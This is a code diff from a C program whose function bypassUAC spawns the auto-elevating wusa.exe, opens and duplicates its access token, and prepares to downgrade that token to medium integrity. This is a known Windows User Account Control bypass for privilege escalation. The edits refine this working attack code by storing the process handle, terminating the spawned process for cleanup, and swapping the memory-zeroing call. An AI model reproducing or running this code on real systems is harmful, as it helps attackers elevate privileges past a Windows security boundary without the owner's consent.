@@ -467,7 +467,7 @@ void bypassUAC(BOOL spawn) {
 	TOKEN_MANDATORY_LABEL sTML;
 	HANDLE pSID;
 	SHELLEXECUTEINFO eWusa;
-	SecureZeroMemory(&eWusa, sizeof(SHELLEXECUTEINFO));
+	memset(&eWusa, 0, sizeof(SHELLEXECUTEINFO));
 	eWusa.cbSize = sizeof(eWusa);
 	eWusa.fMask = 0x40;
 	eWusa.lpFile = L"wusa.exe";
@@ -480,8 +480,9 @@ void bypassUAC(BOOL spawn) {
 	}
 	printf("[+]Process Spawned\n");
 	//Now lets open a handle to the token
+	HANDLE hProcess = eWusa.hProcess;
 	HANDLE hToken;
-	if (!OpenProcessToken(eWusa.hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken)) {
+	if (!OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken)) {
 		printf("OpenProcessToken() error : % u\n", GetLastError());
 		ExitProcess(-1);
 	}
@@ -493,6 +494,8 @@ void bypassUAC(BOOL spawn) {
 		ExitProcess(-1);
 	}
 	printf("[+]DuplicateTokenEx() succeed!\n");
+	//Kill the process for cleanup
+	TerminateProcess(hProcess, 1);
 	//Next we need to downgrade the token into medium integrity level, also remove critical sids and privileges
 	//First we initialize the Sid
 	printf("[*]Creating new restricted SID\n");
